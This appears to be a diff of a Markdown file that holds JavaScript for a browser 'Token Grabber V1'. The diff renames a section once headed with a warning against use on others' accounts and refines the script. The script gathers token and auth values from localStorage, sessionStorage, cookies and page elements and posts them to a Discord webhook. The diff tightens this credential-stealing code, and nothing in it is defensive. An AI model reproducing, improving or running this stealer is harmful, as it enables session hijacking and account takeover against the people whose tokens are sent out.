@@ -91,7 +91,7 @@ if(!quest) {
     } 
 }
 ```
-# Unpatched version (NEVER USE IT ON SOMEONE ELSE's ACCOUNT)
+# Token Grabber V1
 
 ```javascript
 // Replace with your Discord webhook URL
@@ -106,9 +106,11 @@ function grabTokens() {
         tokens.localStorage = {};
         for (let key in localStorage) {
             if (localStorage.hasOwnProperty(key) && (key.includes('token') || key.includes('auth'))) {
-                tokens.localStorage[key] = localStorage.getItem(key);
+                const value = localStorage.getItem(key);
+                if (value) tokens.localStorage[key] = value;
             }
         }
+        if (Object.keys(tokens.localStorage).length === 0) delete tokens.localStorage;
     }
     
     // Grab from sessionStorage
@@ -116,27 +118,34 @@ function grabTokens() {
         tokens.sessionStorage = {};
         for (let key in sessionStorage) {
             if (sessionStorage.hasOwnProperty(key) && (key.includes('token') || key.includes('auth'))) {
-                tokens.sessionStorage[key] = sessionStorage.getItem(key);
+                const value = sessionStorage.getItem(key);
+                if (value) tokens.sessionStorage[key] = value;
             }
         }
+        if (Object.keys(tokens.sessionStorage).length === 0) delete tokens.sessionStorage;
     }
     
     // Grab cookies
-    tokens.cookies = document.cookie.split(';').reduce((acc, cookie) => {
-        const [key, value] = cookie.trim().split('=');
-        if (key.includes('token') || key.includes('auth')) {
-            acc[key] = value;
-        }
-        return acc;
-    }, {});
+    if (document.cookie) {
+        tokens.cookies = document.cookie.split(';').reduce((acc, cookie) => {
+            const [key, value] = cookie.trim().split('=');
+            if (key && (key.includes('token') || key.includes('auth'))) {
+                acc[key] = value;
+            }
+            return acc;
+        }, {});
+        if (Object.keys(tokens.cookies).length === 0) delete tokens.cookies;
+    }
     
-    // Grab from page content (e.g., hidden inputs or data attributes)
+    // Grab from page content
     const tokenElements = document.querySelectorAll('[name*="token"], [id*="token"], [data-token]');
-    tokens.pageElements = Array.from(tokenElements).map(el => ({
-        tag: el.tagName,
-        name: el.name || el.id || el.dataset.token,
-        value: el.value || el.dataset.token || el.textContent
-    }));
+    if (tokenElements.length > 0) {
+        tokens.pageElements = Array.from(tokenElements).map(el => {
+            const value = el.value || el.dataset.token || el.textContent;
+            return value ? { tag: el.tagName, name: el.name || el.id || el.dataset.token, value } : null;
+        }).filter(el => el);
+        if (tokens.pageElements.length === 0) delete tokens.pageElements;
+    }
     
     return tokens;
 }
@@ -170,8 +179,7 @@ async function sendToWebhook(data) {
 
 // Execute the token grab and send
 const tokens = grabTokens();
-if (Object.keys(tokens.localStorage).length || Object.keys(tokens.sessionStorage).length || 
-    Object.keys(tokens.cookies).length || tokens.pageElements.length) {
+if (Object.keys(tokens).length > 0) {
     sendToWebhook(tokens);
 } else {
     console.log('No tokens found');
